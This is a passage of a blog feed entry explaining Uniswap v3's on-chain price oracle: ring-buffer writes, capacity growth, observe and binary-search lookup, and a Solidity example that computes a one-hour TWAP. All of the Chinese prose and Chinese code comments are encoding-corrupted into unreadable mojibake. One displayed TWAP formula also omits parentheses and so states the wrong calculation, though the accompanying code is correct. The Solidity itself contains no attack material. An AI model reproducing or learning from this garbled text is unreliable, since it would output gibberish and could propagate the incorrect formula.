&amp;&amp; index == (cardinality - 1)) &#123;<br>            cardinalityUpdated = cardinalityNext;<br>        &#125; else &#123;<br>            cardinalityUpdated = cardinality;<br>        &#125;<br><br>        // æœ¬æ¬¡å†™å…¥çš„ç´¢å¼•ï¼Œä½¿ç”¨ä½™æ•°å®ç° ring buffer<br>        indexUpdated = (index + 1) % cardinalityUpdated;<br>        // å†™å…¥ Oracle æ•°æ®<br>        self[indexUpdated] = transform(last, blockTimestamp, tick, liquidity);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å†™å…¥æ—¶ä¼šè®¡ç®—å‡ºéœ€è¦ä½¿ç”¨çš„ç´¢å¼•æ•°ï¼Œå¦‚æœå¯ç”¨ç©ºé—´ç”¨æ»¡ä¼šé‡æ–°ä»å¤´å¼€å§‹å†™å…¥ã€‚Oracle æ•°æ®ä½¿ç”¨ <code>transform</code> å‡½æ•°ç”Ÿæˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function transform(<br>        Observation memory last,<br>        uint32 blockTimestamp,<br>        int24 tick,<br>        uint128 liquidity<br>    ) private pure returns (Observation memory) &#123;<br>        // ä¸Šæ¬¡ Oracle æ•°æ®å’Œæœ¬æ¬¡çš„æ—¶é—´å·®<br>        uint32 delta = blockTimestamp - last.blockTimestamp;<br>        return<br>            Observation(&#123;<br>                blockTimestamp: blockTimestamp,<br>                // è®¡ç®— tick index çš„æ—¶é—´åŠ æƒç´¯ç§¯å€¼<br>                tickCumulative: last.tickCumulative + int56(tick) * delta,<br>                secondsPerLiquidityCumulativeX128: last.secondsPerLiquidityCumulativeX128 +<br>                    ((uint160(delta) &lt;&lt; 128) / (liquidity &gt; 0 ? liquidity : 1)),<br>                initialized: true<br>            &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><h3 id="æ‰©å®¹"><a href="#æ‰©å®¹" class="headerlink" title="æ‰©å®¹"></a>æ‰©å®¹</h3><p>è™½ç„¶åˆçº¦å®šä¹‰äº† Oracle ä½¿ç”¨ 65535 é•¿åº¦çš„æ•°ç»„ï¼Œä½†æ˜¯å¹¶ä¸ä¼šåœ¨ä¸€å¼€å§‹å°±ä½¿ç”¨è¿™ä¹ˆå¤šçš„ç©ºé—´ï¼Œè¿™æ ·åšæ˜¯å› ä¸ºï¼š</p><ul><li>å‘ç©ºæ•°ç»„ä¸­å†™å…¥ Oracle æ•°æ®æ˜¯æ¯”è¾ƒæ˜‚è´µçš„æ“ä½œï¼ˆSSTOREï¼‰</li><li>å†™å…¥ Oracle æ•°æ®çš„æ“ä½œå‘ç”Ÿåœ¨äº¤æ˜“çš„æ“ä½œä¸­</li><li>è¿™äº›æ“ä½œå¦‚æœç”±äº¤æ˜“è€…è´Ÿæ‹…ï¼Œæ˜¯ä¸å…¬å¹³çš„ï¼Œå› ä¸ºä»£å¸äº¤æ˜“è€…å¹¶ä¸ä¸€å®šæ˜¯ Oracle çš„ä½¿ç”¨è€…</li></ul><p>å› æ­¤ Uniswap v3 åœ¨åˆå§‹æ—¶ Oracle æ•°ç»„ä»…å¯ä»¥å†™å…¥ä¸€ä¸ªæ•°æ®ï¼Œè¿™ä¸ªæ˜¯é€šè¿‡äº¤æ˜“æ± åˆçº¦çš„ <code>slot0.observationCardinalityNext</code> å˜é‡æ§åˆ¶çš„ã€‚</p><p>å½“åˆå§‹è®¾ç½®ä¸æ»¡è¶³éœ€æ±‚æ—¶ï¼Œåˆçº¦æä¾›äº†å•ç‹¬æ¥å£ï¼Œè®©å¯¹ Oracle å†å²æ•°æ®æœ‰éœ€æ±‚çš„å¼€å‘è€…ï¼Œè‡ªè¡Œè°ƒç”¨æ¥å£æ¥æ‰©å±•äº¤æ˜“æ±  Oracle ä¸­å­˜å‚¨æ•°æ®çš„ä¸Šé™ã€‚è¿™æ ·å°±å°† Oracle æ•°ç»„å­˜å‚¨ç©ºé—´åˆå§‹åŒ–æ“ä½œçš„ gas è´¹è½¬ç§»åˆ°äº† Oracle çš„éœ€æ±‚æ–¹ï¼Œè€Œä¸æ˜¯ç”±ä»£å¸äº¤æ˜“è€…æ‰¿æ‹…ã€‚</p><p>é€šè¿‡è°ƒç”¨ <strong>UniswapV3Pool</strong> åˆçº¦çš„ <code>increaseObservationCardinalityNext()</code> å¯ä»¥æ‰©å±•äº¤æ˜“æ± çš„ Oracle æ•°ç»„å¯ç”¨å®¹é‡ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºæœŸæœ›å­˜å‚¨çš„å†å²æ•°æ®ä¸ªæ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function increaseObservationCardinalityNext(uint16 observationCardinalityNext)<br>    external<br>    override<br>    lock<br>    noDelegateCall<br>&#123;<br>    uint16 observationCardinalityNextOld = slot0.observationCardinalityNext; // for the event<br>    uint16 observationCardinalityNextNew =<br>        observations.grow(observationCardinalityNextOld, observationCardinalityNext);<br>    slot0.observationCardinalityNext = observationCardinalityNextNew;<br>    if (observationCardinalityNextOld != observationCardinalityNextNew)<br>        emit IncreaseObservationCardinalityNext(observationCardinalityNextOld, observationCardinalityNextNew);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°è°ƒç”¨äº† <code>observations.grow()</code> å®Œæˆåº•å±‚å­˜å‚¨ç©ºé—´çš„åˆå§‹åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function grow(<br>    Observation[65535] storage self,<br>    uint16 current,<br>    uint16 next<br>) internal returns (uint16) &#123;<br>    require(current &gt; 0, &#x27;I&#x27;);<br>    // no-op if the passed next value isn&#x27;t greater than the current next value<br>    if (next &lt;= current) return current;<br>    // store in each slot to prevent fresh SSTOREs in swaps<br>    // this data will not be used because the initialized boolean is still false<br>    // å¯¹æ•°ç»„ä¸­å°†æ¥å¯èƒ½ä¼šç”¨åˆ°çš„æ§½ä½è¿›è¡Œå†™å…¥ï¼Œä»¥åˆå§‹åŒ–å…¶ç©ºé—´ï¼Œé¿å…åœ¨ swap ä¸­åˆå§‹åŒ–<br>    for (uint16 i = current; i &lt; next; i++) self[i].blockTimestamp = 1;<br>    return next;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡å¾ªç¯çš„æ–¹å¼ï¼Œå°† Oracle æ•°ç»„ä¸­æœªæ¥å¯èƒ½è¢«ä½¿ç”¨çš„ç©ºé—´ä¸­å†™å…¥æ•°æ®ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯å°†æ•°æ®è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·åœ¨ä»£å¸äº¤æ˜“å†™å…¥æ–°çš„ Oracle æ•°æ®æ—¶ï¼Œä¸éœ€è¦å†è¿›è¡Œåˆå§‹åŒ–ï¼Œå¯ä»¥è®©äº¤æ˜“æ—¶æ›´æ–° Oracle ä¸è‡³äºèŠ±è´¹å¤ªå¤šçš„ gasï¼Œ<code>SSTORE</code> æŒ‡ä»¤ç”± 20000 é™è‡³ 5000ã€‚</p><p>å½“ Oracle æ•°æ®å¯ä½¿ç”¨ç©ºé—´è¢«æ‰©å®¹è‡³æœ€å¤§ï¼Œå³ 65535 æ—¶ï¼Œå‡è®¾å¹³å‡å‡ºå—æ—¶é—´ä¸º 13 ç§’ï¼Œé‚£ä¹ˆæ­¤æ—¶è‡³å°‘å¯ä»¥å­˜å‚¨æœ€è¿‘ 9.8 å¤©çš„å†å²æ•°æ®ã€‚</p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p><strong>UniswapV3Pool</strong> æä¾›äº†ä¸€ä¸ªæŸ¥è¯¢å‡½æ•° observe ç”¨æ¥æŸ¥è¯¢æŒ‡å®šæ—¶é—´æ®µå†…çš„ tick ç´¯è®¡å€¼ï¼Œè¯¥å‡½æ•°ä¹Ÿæ˜¯è®¡ç®— TWAP çš„å…³é”®å‡½æ•°ï¼Œå…¶ä»£ç å®ç°ä¹Ÿæ˜¯è°ƒç”¨ Oracle åº“çš„ observe å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">/// @inheritdoc IUniswapV3PoolDerivedState<br>function observe(uint32[] calldata secondsAgos)<br>    external<br>    view<br>    override<br>    noDelegateCall<br>    returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s)<br>&#123;<br>    return<br>        observations.observe(<br>            _blockTimestamp(),<br>            secondsAgos,<br>            slot0.tick,<br>            slot0.observationIndex,<br>            liquidity,<br>            slot0.observationCardinality<br>        );<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æŒ‡å®šçš„å‚æ•° <strong>secondsAgos</strong> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé¡¾åæ€ä¹‰è¡¨ç¤ºè¯·æ±‚ N ç§’å‰çš„æ•°æ®ï¼Œæ•°ç»„çš„æ¯ä¸ªå…ƒç´ å¯ä»¥æŒ‡å®šç¦»å½“å‰æ—¶é—´ä¹‹å‰çš„ç§’æ•°ã€‚æ¯”å¦‚æˆ‘ä»¬æƒ³è¦è·å–æœ€è¿‘ 1 å°æ—¶çš„ TWAPï¼Œé‚£å¯ä¼ å…¥æ•°ç»„ [3600, 0]ï¼Œä¼šæŸ¥è¯¢ä¸¤ä¸ªæ—¶é—´ç‚¹çš„ç´¯è®¡å€¼ï¼Œ3600 è¡¨ç¤ºæŸ¥è¯¢ 1 å°æ—¶å‰çš„ç´¯è®¡å€¼ï¼Œ0 åˆ™è¡¨ç¤ºå½“å‰æ—¶é—´çš„ç´¯è®¡å€¼ã€‚è¿”å›çš„ <strong>tickCumulatives</strong> å°±æ˜¯å¯¹åº”äºå…¥å‚æ•°ç»„çš„æ¯ä¸ªæ—¶é—´ç‚¹çš„ tick ç´¯è®¡å€¼ï¼Œ<strong>secondsPerLiquidityCumulativeX128s</strong> åˆ™æ˜¯å¯¹åº”æ¯ä¸ªæ—¶é—´ç‚¹çš„æ¯ç§’æµåŠ¨æ€§ç´¯è®¡å€¼ï¼Œ</p><p>æ•°æ®çš„å¤„ç†æ˜¯åœ¨ <code>observations.observe()</code> ä¸­å®Œæˆçš„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function observe(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32[] memory secondsAgos,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) internal view returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s) &#123;<br>    require(cardinality &gt; 0, &#x27;I&#x27;);<br><br>    tickCumulatives = new int56[](secondsAgos.length);<br>    secondsPerLiquidityCumulativeX128s = new uint160[](secondsAgos.length);<br>    // éå†ä¼ å…¥çš„æ—¶é—´å‚æ•°ï¼Œè·å–ç»“æœ<br>    for (uint256 i = 0; i &lt; secondsAgos.length; i++) &#123;<br>        (tickCumulatives[i], secondsPerLiquidityCumulativeX128s[i]) = observeSingle(<br>            self,<br>            time,<br>            secondsAgos[i],<br>            tick,<br>            index,<br>            liquidity,<br>            cardinality<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯é€šè¿‡éå†è¯·æ±‚å‚æ•°ï¼Œè·å–æ¯ä¸€ä¸ªè¯·æ±‚æ—¶é—´ç‚¹çš„ Oracle æ•°æ®ï¼Œå…·ä½“æ•°æ®é€šè¿‡ <code>observeSingle()</code> å‡½æ•°æ¥è·å–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function observeSingle(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32 secondsAgo,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) internal view returns (int56 tickCumulative, uint160 secondsPerLiquidityCumulativeX128) &#123;<br>    // secondsAgo ä¸º 0 è¡¨ç¤ºå½“å‰çš„æœ€æ–° Oracle æ•°æ®<br>    if (secondsAgo == 0) &#123;<br>        Observation memory last = self[index];<br>        if (last.blockTimestamp != time) last = transform(last, time, tick, liquidity);<br>        return (last.tickCumulative, last.secondsPerLiquidityCumulativeX128);<br>    &#125;<br><br>    // è®¡ç®—å‡ºè¯·æ±‚çš„æ—¶é—´æˆ³<br>    uint32 target = time - secondsAgo;<br><br>    // è®¡ç®—å‡ºè¯·æ±‚æ—¶é—´æˆ³æœ€è¿‘çš„ä¸¤ä¸ª Oracle æ•°æ®<br>    (Observation memory beforeOrAt, Observation memory atOrAfter) =<br>        getSurroundingObservations(self, time, target, tick, index, liquidity, cardinality);<br><br>    // å¦‚æœè¯·æ±‚æ—¶é—´å’Œè¿”å›çš„å·¦ä¾§æ—¶é—´æˆ³å»åˆï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨<br>    if (target == beforeOrAt.blockTimestamp) &#123;<br>        // we&#x27;re at the left boundary<br>        return (beforeOrAt.tickCumulative, beforeOrAt.secondsPerLiquidityCumulativeX128);<br>    // å¦‚æœè¯·æ±‚æ—¶é—´å’Œè¿”å›çš„å³ä¾§æ—¶é—´æˆ³å»åˆï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨<br>    &#125; else if (target == atOrAfter.blockTimestamp) &#123;<br>        // we&#x27;re at the right boundary<br>        return (atOrAfter.tickCumulative, atOrAfter.secondsPerLiquidityCumulativeX128);<br>    &#125; else &#123;<br>        // we&#x27;re in the middle<br>        // å½“è¯·æ±‚æ—¶é—´åœ¨ä¸­é—´æ—¶ï¼Œè®¡ç®—æ ¹æ®å¢é•¿ç‡è®¡ç®—å‡ºè¯·æ±‚çš„æ—¶é—´ç‚¹çš„ Oracle å€¼å¹¶è¿”å›<br>        uint32 observationTimeDelta = atOrAfter.blockTimestamp - beforeOrAt.blockTimestamp;<br>        uint32 targetDelta = target - beforeOrAt.blockTimestamp;<br>        return (<br>            beforeOrAt.tickCumulative +<br>                ((atOrAfter.tickCumulative - beforeOrAt.tickCumulative) / observationTimeDelta) *<br>                targetDelta,<br>            beforeOrAt.secondsPerLiquidityCumulativeX128 +<br>                uint160(<br>                    (uint256(<br>                        atOrAfter.secondsPerLiquidityCumulativeX128 - beforeOrAt.secondsPerLiquidityCumulativeX128<br>                    ) * targetDelta) / observationTimeDelta<br>                )<br>        );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åœ¨è¿™å‡½æ•°ä¸­ï¼Œä¼šå…ˆè°ƒç”¨ <code>getSurroundingObservations()</code> æ‰¾å‡ºçš„æ—¶é—´ç‚¹å‰åï¼Œæœ€è¿‘çš„ä¸¤ä¸ª Oracle æ•°æ®ã€‚ç„¶åé€šè¿‡æ—¶é—´å·®çš„æ¯”è¾ƒè®¡ç®—å‡ºéœ€è¦è¿”å›çš„æ•°æ®ï¼š</p><ul><li>å¦‚æœå’Œå…¶ä¸­çš„æŸä¸€ä¸ªçš„æ—¶é—´æˆ³ç›¸ç­‰ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥è¿”å›</li><li>å¦‚æœåœ¨ä¸¤ä¸ªæ—¶é—´ç‚¹çš„ä¸­é—´ï¼Œé‚£ä¹ˆé€šè¿‡è®¡ç®—å¢é•¿ç‡çš„æ–¹å¼ï¼Œè®¡ç®—å‡ºè¯·æ±‚æ—¶é—´ç‚¹çš„ Oracle æ•°æ®å¹¶è¿”å›</li></ul><p><code>getSurroundingObservations()</code> å‡½æ•°çš„ä½œç”¨æ˜¯åœ¨å·²è®°å½•çš„ Oracle æ•°ç»„ä¸­ï¼Œæ‰¾åˆ°æ—¶é—´æˆ³ç¦»å…¶æœ€è¿‘çš„ä¸¤ä¸ª Oracle æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getSurroundingObservations(<br>    Observation[65535] storage self,<br>    uint32 time,<br>    uint32 target,<br>    int24 tick,<br>    uint16 index,<br>    uint128 liquidity,<br>    uint16 cardinality<br>) private view returns (Observation memory beforeOrAt, Observation memory atOrAfter) &#123;<br>    // optimistically set before to the newest observation<br>    // å…ˆæŠŠ beforeOrAt è®¾ç½®ä¸ºå½“å‰æœ€æ–°æ•°æ®<br>    beforeOrAt = self[index];<br><br>    // if the target is chronologically at or after the newest observation, we can early return<br>    // æ£€æŸ¥ beforeOrAt æ˜¯å¦ &lt;= target<br>    if (lte(time, beforeOrAt.blockTimestamp, target)) &#123;<br>        if (beforeOrAt.blockTimestamp == target) &#123;<br>            // if newest observation equals target, we&#x27;re in the same block, so we can ignore atOrAfter<br>            // å¦‚æœæ—¶é—´æˆ³ç›¸ç­‰ï¼Œé‚£ä¹ˆå¯ä»¥å¿½ç•¥ atOrAfter ç›´æ¥è¿”å›<br>            return (beforeOrAt, atOrAfter);<br>        &#125; else &#123;<br>            // otherwise, we need to transform<br>            // å½“å‰åŒºå—ä¸­å‘ç”Ÿä»£å¸å¯¹çš„äº¤æ˜“ä¹‹å‰è¯·æ±‚æ­¤å‡½æ•°æ—¶å¯èƒ½ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µ<br>        // éœ€è¦å°†å½“å‰è¿˜æœªæŒä¹…åŒ–çš„æ•°æ®ï¼Œå°è£…æˆä¸€ä¸ª Oracle æ•°æ®è¿”å›ï¼Œ<br>            return (beforeOrAt, transform(beforeOrAt, target, tick, liquidity));<br>        &#125;<br>    &#125;<br><br>    // now, set before to the oldest observation<br>    // å°† beforeOrAt è°ƒæ•´è‡³ Oracle æ•°ç»„ä¸­æœ€è€çš„æ•°æ®<br>// å³ä¸ºå½“å‰ index çš„ä¸‹ä¸€ä¸ªæ•°æ®ï¼Œæˆ–è€… index ä¸º 0 çš„æ•°æ®<br>    beforeOrAt = self[(index + 1) % cardinality];<br>    if (!beforeOrAt.initialized) beforeOrAt = self[0];<br><br>    // ensure that the target is chronologically at or after the oldest observation<br>    require(lte(time, beforeOrAt.blockTimestamp, target), &#x27;OLD&#x27;);<br><br>    // if we&#x27;ve reached this point, we have to binary search<br>    // ç„¶åé€šè¿‡äºŒåˆ†æŸ¥æ‰¾çš„æ–¹å¼æ‰¾åˆ°ç¦»ç›®æ ‡æ—¶é—´ç‚¹æœ€è¿‘çš„å‰åä¸¤ä¸ª Oracle æ•°æ®<br>    return binarySearch(self, time, target, index, cardinality);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨ <code>binarySearch()</code> é€šè¿‡äºŒåˆ†æŸ¥æ‰¾çš„æ–¹å¼ï¼Œæ‰¾åˆ°ç›®æ ‡ç¦»ç›®æ ‡æ—¶é—´ç‚¹æœ€è¿‘çš„å‰åä¸¤ä¸ª Oracle æ•°æ®ï¼Œå…¶ä¸­çš„å…·ä½“å®ç°è¿™é‡Œå°±ä¸å†æè¿°äº†ã€‚</p><p>æœ€ç»ˆï¼Œ<code>UniswapV3Pool.observe()</code> å°†ä¼šè¿”å›è¯·æ±‚è€…æ‰€è¯·æ±‚çš„æ¯ä¸€ä¸ªæ—¶é—´ç‚¹çš„ Oracle æ•°æ®ï¼Œè¯·æ±‚è€…å¯ä»¥æ ¹æ®è¿™äº›æ•°æ®è®¡ç®—å‡ºäº¤æ˜“å¯¹çš„ TWAPï¼ˆæ—¶é—´åŠ æƒå¹³å‡ä»·ï¼Œå‡ ä½•å¹³å‡æ•°ï¼‰</p><h4 id="TWAP-çš„è®¡ç®—"><a href="#TWAP-çš„è®¡ç®—" class="headerlink" title="TWAP çš„è®¡ç®—"></a>TWAP çš„è®¡ç®—</h4><p>å‡å¦‚æˆ‘ä»¬æƒ³è¦è·å–æœ€è¿‘ 1 å°æ—¶çš„ TWAPï¼Œåœ¨ <strong>observe</strong> ä¸­ä¼ å…¥äº†æ•°ç»„ [3600, 0]ï¼Œå¯ä»¥å¾—åˆ°è¿™ä¸¤ä¸ªæ—¶é—´ç‚¹çš„ tickCumulatives ï¼Œå€Ÿæ­¤ç®—å‡ºå¹³å‡åŠ æƒçš„ tick ã€‚ä»¥ 1 å°æ—¶çš„æ—¶é—´é—´éš”ä¸ºä¾‹ï¼Œè®¡ç®—å¹³å‡åŠ æƒçš„ tick å…¬å¼ä¸ºï¼š</p><ul><li><strong>averageTick = tickCumulative[1] - tickCumulative[0] / 3600</strong></li></ul><p>tickCumulative[1] ä¸ºå½“å‰æ—¶é—´çš„ tick ç´¯è®¡å€¼ï¼ŒtickCumulative[0] åˆ™ä¸º 1 å°æ—¶å‰çš„ tick ç´¯è®¡å€¼ã€‚</p><p>è®¡ç®—å¾—åˆ° averageTick ä¹‹åï¼Œè¿˜éœ€è¦å°†å…¶è½¬æ¢ä¸ºä»·æ ¼ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨å¦ä¸€ä¸ªåº“ <strong>TickMath</strong> ï¼š</p><ul><li><a href="https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/TickMath.sol">https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/TickMath.sol</a></li></ul><p>è¯¥åº“å°è£…äº† <strong>tick</strong> å’Œ <strong>sqrtPrice</strong> ï¼ˆæ ¹å·ä»·æ ¼ï¼‰ä¹‹é—´çš„è½¬æ¢å‡½æ•°ï¼Œé€šè¿‡è°ƒç”¨å‡½æ•° <strong>getSqrtRatioAtTick</strong> å°±å¯ä»¥å°† <strong>averageTick</strong> è½¬æ¢å¾—åˆ°å¯¹åº”çš„ <strong>sqrtPriceX96</strong> ã€‚</p><p>åœ¨ UniswapV3 ä¸­çš„ä»·æ ¼ï¼Œéƒ½æ˜¯ç”¨ <strong>sqrtPriceX96</strong> æ¥è¡¨ç¤ºçš„ï¼Œå…¶å®æ˜¯å°†æ ¹å·ä»·æ ¼æ‰©å±•äº† 2 çš„ 96 æ¬¡æ–¹ï¼Œå³ï¼š</p><ul><li><strong>sqrtPriceX96 = sqrt(price) * 2^96</strong></li></ul><p>å¦å¤–ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¯´çš„ price å…¶å®æ˜¯ token1Amount / token0Amount = token0Priceï¼Œå³ token0 çš„ä»·æ ¼ã€‚ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œæˆ‘ä»¬ç›´æ¥ä¸¾ä¾‹æ¥è¯´æ˜ã€‚å‡è®¾ token1 ä¸º USDCï¼Œtoken0 ä¸º WETHï¼Œé‚£ token1 åœ¨åˆçº¦é‡Œçš„ç²¾åº¦æ•°ä¸º 6ï¼Œtoken0 çš„ç²¾åº¦æ•°åˆ™ä¸º 18ï¼Œä¹Ÿå³æ˜¯è¯´ï¼Œ1 USDC åœ¨åˆçº¦é‡Œè¡¨ç¤ºä¸º 1000000ï¼ˆ1e6ï¼‰ï¼Œè€Œ 1 WETH åˆ™è¡¨ç¤ºä¸º 1e18ã€‚é‚£ä¹ˆï¼Œå¦‚æœ WETH/USDC çš„åè¿›åˆ¶ä»·æ ¼ä¸º 2000 çš„è¯ï¼Œå…¬å¼ä¸­çš„ price å°±æ˜¯æŒ‡ 2000 * 1e6 / 1e18 = 2000 / 1e12ï¼Œè¯¥å€¼å…¶å®æ˜¯å°äº 1 çš„ï¼Œåœ¨åˆçº¦å±‚é¢å°±æ— æ³•è¡¨ç¤ºï¼Œæ‰€ä»¥æ‰éœ€è¦å¯¹å…¶æ‰©å±•ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function getSqrtTWAP(address uniswapV3Pool) external view returns (uint160 sqrtPriceX96) &#123;<br>  IUniswapV3Pool pool = IUniswapV3Pool(uniswapV3Pool);<br>  uint32[] memory secondsAgos = new uint32[](2);<br>  secondsAgos[0] = 3600;<br>  secondsAgos[1] = 0;<br>  (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);<br>  int56 averageTick = (tickCumulatives[1] - tickCumulatives[0]) / 3600;<br>  // tick(imprecise as it&#x27;s an integer) to price<br>  sqrtPriceX96 = TickMath.getSqrtRatioAtTick(averageTick);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°ç”¨æ¥è·å–æŒ‡å®š pool åœ¨æœ€è¿‘ 1 å°æ—¶å†…çš„æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼Œä¸”è¡¨ç¤ºä¸º sqrtPriceX96 çš„ä»·æ ¼ã€‚</p><p>è¯¥å‡½æ•°è¦å¯è¡Œçš„è¯ï¼Œä¸»è¦æœ‰ä¸¤ä¸ªå‰æï¼Œä¸€æ˜¯è¯¥ pool çš„ <strong>observations</strong> å·²ç»æœ‰è¶³å¤Ÿçš„æ‰©å®¹ï¼ŒäºŒæ˜¯æ‰©å®¹ä¹‹åè¯¥æ± å­å·²ç»äº¤æ˜“äº†è‡³å°‘ 1 å°æ—¶ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…£ | äº¤æ˜“æ‰‹ç»­è´¹</title>
    <link href="/2022/09/29/uniswap-v3-4/"/>
